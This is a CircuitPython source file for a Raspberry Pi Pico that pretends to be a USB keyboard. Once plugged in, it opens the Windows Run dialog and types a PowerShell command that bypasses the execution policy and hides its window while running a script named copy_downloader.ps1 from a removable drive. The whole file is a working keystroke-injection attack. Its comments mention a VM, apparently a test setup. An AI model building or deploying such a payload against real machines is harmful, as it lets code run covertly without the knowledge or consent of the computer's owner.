# code.py — Pico HID types PowerShell command with execution bypass
import time, usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayout
from adafruit_hid.keycode import Keycode

time.sleep(5)  # wait for VM to mount Pico and detect USB

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)

# PowerShell command: run .ps1 with ExecutionPolicy Bypass
ps_cmd = 'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File E:\\copy_downloader.ps1'

# Open Run dialog
kbd.send(Keycode.WINDOWS, Keycode.R)
time.sleep(1.5)  # give VM time to open Run dialog

# Type the command
layout.write(ps_cmd)
time.sleep(0.5)

# Press Enter
kbd.send(Keycode.ENTER)
